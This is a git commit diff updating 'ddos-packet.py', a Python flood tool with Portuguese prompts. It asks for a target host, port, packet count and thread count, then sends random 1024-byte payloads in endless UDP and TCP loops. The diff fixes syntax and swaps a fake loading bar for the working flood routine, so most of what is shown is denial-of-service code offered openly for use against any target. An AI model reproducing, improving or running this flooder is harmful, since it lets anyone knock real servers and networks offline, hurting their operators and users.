058ad66b9b78418781bd845be05d6a396804aee4
Elbielzinho <59930738+Elbielzinho@users.noreply.github.com>
2020-09-01 17:40:58 -0300

    Update ddos-packet.py

--- ddos-packet.py
+++ ddos-packet.py
@@ -2,7 +2,6 @@
 #Code by LeeOn123
 #Codigo melhorado 2x por Elbielzinho
 import sys
-import system
 import os
 import time
 import random
@@ -24,35 +23,23 @@ print("--> Criador Elbielzinho <--")
 print("")
 ip = str(input(" Host/Ip:"))
 port = int(input(" Port:"))
+print("")
 choice = str(input(" Packet(y/n):"))
 ddos = str(input(" DDoS(y/n):"))
+print("")
 times = int(input(" Tamanho de Packet/DDoS:"))
 threads = int(input(" Potencia:"))
 def run():
-
-os.system("figlet CARREGANDO")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[=================     ] 99%"
-time.sleep(10)
-print "[≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠] ERROR"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
-sent = 0
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(" ATAQUE ENVIANDO PARA ",(ip)" COM SUCESSO ")
+			print(" ENVIANDO PACKET COM SUCESSO")
+			print("")
 		except:
 			print("DDoS/Packet ERROR")
 			print("The attack failed")
@@ -67,7 +54,8 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(" ATAQUE ENVIANDO PARA ",(ip)" COM SUCESSO ")
+			print(" ENVIANDO DDOS COM SUCESSO")
+			print("")
 		except:
 			s.close()
 			print("DDoS/Packet ERROR")
